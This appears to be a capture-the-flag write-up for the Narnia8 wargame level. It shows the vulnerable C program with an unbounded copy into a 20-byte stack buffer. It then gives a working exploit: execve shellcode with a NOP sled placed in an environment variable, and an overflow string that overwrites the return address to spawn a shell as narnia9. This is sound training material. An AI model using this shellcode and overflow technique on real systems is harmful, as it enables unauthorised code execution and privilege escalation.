<pre> ```c #include &lt;stdlib.h&gt; #include &lt;string.h&gt; // gcc's variable reordering fucked things up // to keep the level in its old style i am // making "i" global until i find a fix // -morla int i; void func(char *b){ char *blah = b; char bok[20]; // int i = 0; memset(bok, '\0', sizeof(bok)); for(i = 0; blah[i] != '\0'; i++) bok[i] = blah[i]; printf("%s\n", bok); } int main(int argc, char **argv){ if(argc > 1) func(argv[1]); else printf("%s argument\n", argv[0]); return 0; } ``` ## Narnia8 - Buffer Overflow Exploitation ### ðŸ§  Goal Gain a shell as `narnia9` by exploiting a buffer overflow in the `narnia8` binary. --- ### âœ… Step 1 â€“ Review the vulnerable code The `func()` copies user input to a 20-byte buffer without bounds checking: ```c for(i = 0; blah[i] != '\0'; i++) bok[i] = blah[i]; ``` - `bok` has 20 bytes. - Input from `blah` is copied without bounds checking. - A buffer overflow occurs by overwriting the saved return address (EIP). - `i` is global, which affects stack layout slightly. --- ### âœ… Step 2 â€“ Exploit strategy - Inject a shellcode in an environment variable: `SHELLCODE`. - Fill the buffer and overwrite return address to jump to shellcode. - Used NOP sled to increase chances of successful jump. --- ### âœ… Final Payload We calculated the offset, leaked the environment address via GDB: ```bash export SHELLCODE=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*50 + b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")') ./narnia8 $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x71\xd5\xff\xff" + b"AAAA" + b"\xc0\xd5\xff\xff")') ``` --- ### âœ… Result ```bash bash-5.2$ whoami narnia9 ``` --- </pre>
